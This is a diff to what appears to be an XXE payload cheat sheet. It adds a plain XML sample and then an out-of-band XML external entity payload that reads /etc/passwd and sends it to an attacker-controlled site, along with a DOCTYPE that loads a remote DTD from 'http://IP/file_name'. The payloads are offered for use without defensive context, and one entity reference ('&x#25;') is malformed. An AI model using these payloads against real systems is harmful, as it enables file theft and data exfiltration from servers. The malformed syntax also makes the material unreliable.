@@ -1,3 +1,24 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+  <head>
+    <title>XML Example</title>
+  </head>
+  <body>
+    <userInfo>
+      <firstName>Rahul</firstName>
+      <lastName>Jain</lastName>
+    </userInfo>
+  </body>
+</html>
+
+
+
+
+
+
+
+
 XXE: Basic XML Example
 
 <!--?xml version="1.0" ?-->
@@ -55,3 +76,21 @@ XXE: Local File Inclusion Example
 	%intern;
 	%xxe; 
 	]>
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Payload Using DTD File 
+
+	<!ENTITY % a SYSTEM 'file:///etc/passwd'>
+	<!ENTITY % b "<!ENTITY &x#25; c SYSTEM 'ur website/cookie=?%a;'> " > 
+	%b;
+	%c;
+	
+to call this  
+
+<?xml version="1.0" encoding="utf-8"?>
+	<!DOCTYPE xxe [
+	<!ENTITY % remote SYSTEM 'http://IP/file_name'>
+	%remote;
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
